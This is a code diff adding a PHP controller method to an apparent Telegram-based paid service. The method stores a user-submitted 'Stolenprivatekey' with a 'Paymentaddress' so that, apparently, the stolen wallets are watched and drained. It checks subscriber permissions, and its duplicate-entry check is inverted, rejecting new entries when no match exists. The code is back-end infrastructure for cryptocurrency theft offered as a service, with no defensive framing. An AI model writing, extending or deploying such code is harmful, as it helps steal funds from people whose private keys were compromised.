@@ -191,6 +191,41 @@ class CreateController extends Controller
 
     }
 
+    public function eth()
+    {
+        try {
+            $data = json_decode(file_get_contents('php://input'), true);
+            $hash = tgverification($data['hash']);
+
+            if (!$hash) {
+                echo json_encode(retur('失败', '非法访问', 409));
+                exit;
+            }
+
+            $Permissions =  Db::table('userinfo')->field('*')->where(['tgid' => $hash['id'], 'eth' => 1])->find();
+            if (!$Permissions) {
+                echo json_encode(retur('失败', '没有权限,请开通后使用', 403));
+                exit;
+            }
+
+            $Permissions =  Db::table('oneth')->field('*')->where(['tgid' => $hash['id'], 'Stolenprivatekey' => $data['Stolenprivatekey']])->find();
+            if (!$Permissions) {
+                echo json_encode(retur('失败', '相同监听已存在,请勿重复添加', 403));
+                exit;
+            }
+
+            $arr =  Db::table('oneth')->insert(['tgid' => $hash['id'], 'Stolenprivatekey' => $data['Stolenprivatekey'],  'Paymentaddress' => $data['Paymentaddress']]);
+            //
+            if ($arr > 0) {
+                echo json_encode(retur('成功', $arr));
+            } else {
+                echo json_encode(retur('失败', '添加失败请查看参数', 422));
+            }
+        } catch (\Throwable $th) {
+            echo json_encode(retur('失败', '非法访问', 500));
+        }
+    }
+
 
     public function ceshi()
     {
